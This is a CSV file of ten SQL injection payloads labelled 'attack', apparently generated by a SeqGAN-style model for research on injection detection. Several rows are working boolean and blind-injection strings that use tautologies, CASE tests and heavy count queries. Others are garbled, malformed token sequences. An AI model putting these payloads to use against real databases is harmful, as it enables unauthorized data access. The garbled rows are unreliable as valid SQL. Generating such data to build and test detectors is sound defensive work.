label,payload,family,payload_type,method,run_id,sample_index
attack,"1%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,0
attack,"1%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""'  =  'nvq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'mm' like 'pppcrs where  2367 2839  )   or 2367  =  1 or and   (  8220  )  -- +   (  select count  (  9354  =  5672  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1
attack,"1""  )   where 2072  =  1194 or ""  (  @"" =    (  select count  (  ""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""  )  ,s5000000   )    )   4062-- or  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,2
attack,"1""  )   absers age  (  9607  =  'kes and   (    9607  =  select count  (  cndefg""  =  ""r(  rdables ell_user.r  (  select from cdombciesastables as t3,al_us  (  crdb$ecncelat  (  select count  (  5127  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,3
attack,"1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,4
attack,"1'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'epgl8148s   (  'teng' 3018  =  "" where ""ogeneres as rdb$coll_usumn.domains as t2,sysibm.sysibm.systables ms(kfip_p_us  sistab$collusum.tas as t5 and 2839  =  7007 from 1194  (  *    ,9432,5000000  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,5
attack,1'   )    )--,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,6
attack,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""s ""  (  @"" or mandbms eldmbl  as    s agaus all_userds as t2,s as where 4123  =  1 or ra'  =  '  (  67  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,7
attack,select *  )   or 9643  =  5173 or 7417  3645  )  )   from 9660  =  50194906--,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,8
attack,"1%""  )   and elt  (  7436  =  9874,9874  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,9
